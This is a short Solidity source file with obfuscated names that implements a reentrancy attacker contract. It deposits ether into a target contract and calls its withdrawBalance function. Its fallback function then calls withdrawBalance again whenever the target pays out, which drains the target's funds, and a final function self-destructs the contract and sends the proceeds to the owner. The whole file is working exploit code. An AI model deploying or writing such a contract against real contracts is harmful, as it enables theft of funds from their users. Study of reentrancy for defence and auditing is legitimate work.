pragma solidity ^0.4.15;

contract RecordsAdministrator {
    bool public operationOperational=false;
    address public objective_policy;
    address public owner;

    function RecordsAdministrator() public{
        owner = msg.sender;
    }

    function submitPayment(address _objective_policy) public payable{
        objective_policy = _objective_policy ;

        require(objective_policy.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
    }

    function launch_handler() public{
        operationOperational = true;


        require(objective_policy.call(bytes4(sha3("withdrawBalance()"))));
    }

    function () public payable{

        if (operationOperational){
            operationOperational = false;
                require(objective_policy.call(bytes4(sha3("withdrawBalance()"))));
        }
    }

    function acquire_money(){
        suicide(owner);
    }

}